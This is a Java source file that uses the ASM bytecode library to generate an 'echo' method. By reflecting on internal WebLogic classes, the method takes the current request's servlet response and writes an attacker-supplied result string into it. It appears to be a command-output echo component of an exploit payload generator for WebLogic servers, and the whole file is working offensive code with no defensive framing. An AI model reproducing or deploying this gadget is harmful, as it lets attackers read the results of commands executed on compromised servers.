package top.racerz.echo;

import org.objectweb.asm.*;

public class Weblogic implements Opcodes {
    public static void insert(ClassWriter cw, String option) {
        MethodVisitor mv = null;

        {
            mv = cw.visitMethod(ACC_PUBLIC, "echo", "()V", null, new String[]{"java/lang/Exception"});
            mv.visitCode();
            Label l0 = new Label();
            mv.visitLabel(l0);
            mv.visitLineNumber(44, l0);
            mv.visitLdcInsn("weblogic.work.ExecuteThread");
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitVarInsn(ASTORE, 1);
            Label l1 = new Label();
            mv.visitLabel(l1);
            mv.visitLineNumber(45, l1);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitLdcInsn("getCurrentWork");
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ASTORE, 2);
            Label l2 = new Label();
            mv.visitLabel(l2);
            mv.visitLineNumber(46, l2);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Thread", "currentThread", "()Ljava/lang/Thread;", false);
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitVarInsn(ASTORE, 3);
            Label l3 = new Label();
            mv.visitLabel(l3);
            mv.visitLineNumber(48, l3);
            mv.visitLdcInsn("weblogic.servlet.internal.ServletRequestImpl");
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitVarInsn(ASTORE, 4);
            Label l4 = new Label();
            mv.visitLabel(l4);
            mv.visitLineNumber(49, l4);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitLdcInsn("getResponse");
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ASTORE, 5);
            Label l5 = new Label();
            mv.visitLabel(l5);
            mv.visitLineNumber(50, l5);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitVarInsn(ASTORE, 6);
            Label l6 = new Label();
            mv.visitLabel(l6);
            mv.visitLineNumber(52, l6);
            mv.visitLdcInsn("weblogic.servlet.internal.ServletResponseImpl");
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitVarInsn(ASTORE, 7);
            Label l7 = new Label();
            mv.visitLabel(l7);
            mv.visitLineNumber(53, l7);
            mv.visitVarInsn(ALOAD, 7);
            mv.visitLdcInsn("getServletOutputStream");
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ASTORE, 8);
            Label l8 = new Label();
            mv.visitLabel(l8);
            mv.visitLineNumber(54, l8);
            mv.visitVarInsn(ALOAD, 8);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitVarInsn(ASTORE, 9);
            Label l9 = new Label();
            mv.visitLabel(l9);
            mv.visitLineNumber(56, l9);
            mv.visitLdcInsn("weblogic.xml.util.StringInputStream");
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitVarInsn(ASTORE, 10);
            Label l10 = new Label();
            mv.visitLabel(l10);
            mv.visitLineNumber(57, l10);
            mv.visitVarInsn(ALOAD, 10);
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredConstructor", "([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;", false);
            mv.visitVarInsn(ASTORE, 11);
            Label l11 = new Label();
            mv.visitLabel(l11);
            mv.visitLineNumber(58, l11);
            mv.visitVarInsn(ALOAD, 11);
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitFieldInsn(GETFIELD, option, "result", "Ljava/lang/String;");
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Constructor", "newInstance", "([Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitVarInsn(ASTORE, 12);
            Label l12 = new Label();
            mv.visitLabel(l12);
            mv.visitLineNumber(60, l12);
            mv.visitLdcInsn("weblogic.servlet.internal.ServletOutputStreamImpl");
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitVarInsn(ASTORE, 13);
            Label l13 = new Label();
            mv.visitLabel(l13);
            mv.visitLineNumber(61, l13);
            mv.visitVarInsn(ALOAD, 13);
            mv.visitLdcInsn("writeStream");
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ALOAD, 10);
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ASTORE, 14);
            Label l14 = new Label();
            mv.visitLabel(l14);
            mv.visitLineNumber(62, l14);
            mv.visitVarInsn(ALOAD, 14);
            mv.visitVarInsn(ALOAD, 9);
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ALOAD, 12);
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitInsn(POP);
            Label l15 = new Label();
            mv.visitLabel(l15);
            mv.visitLineNumber(64, l15);
            mv.visitVarInsn(ALOAD, 13);
            mv.visitLdcInsn("flush");
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ASTORE, 15);
            Label l16 = new Label();
            mv.visitLabel(l16);
            mv.visitLineNumber(65, l16);
            mv.visitVarInsn(ALOAD, 15);
            mv.visitVarInsn(ALOAD, 9);
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitInsn(POP);
            Label l17 = new Label();
            mv.visitLabel(l17);
            mv.visitLineNumber(67, l17);
            mv.visitVarInsn(ALOAD, 7);
            mv.visitLdcInsn("getWriter");
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ASTORE, 16);
            Label l18 = new Label();
            mv.visitLabel(l18);
            mv.visitLineNumber(68, l18);
            mv.visitVarInsn(ALOAD, 16);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitVarInsn(ASTORE, 17);
            Label l19 = new Label();
            mv.visitLabel(l19);
            mv.visitLineNumber(70, l19);
            mv.visitLdcInsn("java.io.PrintWriter");
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitVarInsn(ASTORE, 18);
            Label l20 = new Label();
            mv.visitLabel(l20);
            mv.visitLineNumber(71, l20);
            mv.visitVarInsn(ALOAD, 18);
            mv.visitLdcInsn("write");
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ASTORE, 19);
            Label l21 = new Label();
            mv.visitLabel(l21);
            mv.visitLineNumber(72, l21);
            mv.visitVarInsn(ALOAD, 19);
            mv.visitVarInsn(ALOAD, 17);
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn("");
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitInsn(POP);
            Label l22 = new Label();
            mv.visitLabel(l22);
            mv.visitLineNumber(74, l22);
            mv.visitInsn(RETURN);
            Label l23 = new Label();
            mv.visitLabel(l23);
            mv.visitLocalVariable("this", "L"+ option + ";", null, l0, l23, 0);
            mv.visitLocalVariable("clazz", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", l1, l23, 1);
            mv.visitLocalVariable("m", "Ljava/lang/reflect/Method;", null, l2, l23, 2);
            mv.visitLocalVariable("currentWork", "Ljava/lang/Object;", null, l3, l23, 3);
            mv.visitLocalVariable("servletRequestImpl", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", l4, l23, 4);
            mv.visitLocalVariable("m2", "Ljava/lang/reflect/Method;", null, l5, l23, 5);
            mv.visitLocalVariable("response", "Ljava/lang/Object;", null, l6, l23, 6);
            mv.visitLocalVariable("servletResponseImpl", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", l7, l23, 7);
            mv.visitLocalVariable("m3", "Ljava/lang/reflect/Method;", null, l8, l23, 8);
            mv.visitLocalVariable("outputStream", "Ljava/lang/Object;", null, l9, l23, 9);
            mv.visitLocalVariable("stringInputStream", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", l10, l23, 10);
            mv.visitLocalVariable("constructor", "Ljava/lang/reflect/Constructor;", "Ljava/lang/reflect/Constructor<*>;", l11, l23, 11);
            mv.visitLocalVariable("resultStream", "Ljava/lang/Object;", null, l12, l23, 12);
            mv.visitLocalVariable("servletOutputStreamImpl", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", l13, l23, 13);
            mv.visitLocalVariable("m4", "Ljava/lang/reflect/Method;", null, l14, l23, 14);
            mv.visitLocalVariable("m5", "Ljava/lang/reflect/Method;", null, l16, l23, 15);
            mv.visitLocalVariable("m6", "Ljava/lang/reflect/Method;", null, l18, l23, 16);
            mv.visitLocalVariable("writer", "Ljava/lang/Object;", null, l19, l23, 17);
            mv.visitLocalVariable("printWriter", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", l20, l23, 18);
            mv.visitLocalVariable("m7", "Ljava/lang/reflect/Method;", null, l21, l23, 19);
            mv.visitMaxs(6, 20);
            mv.visitEnd();
        }
    }
}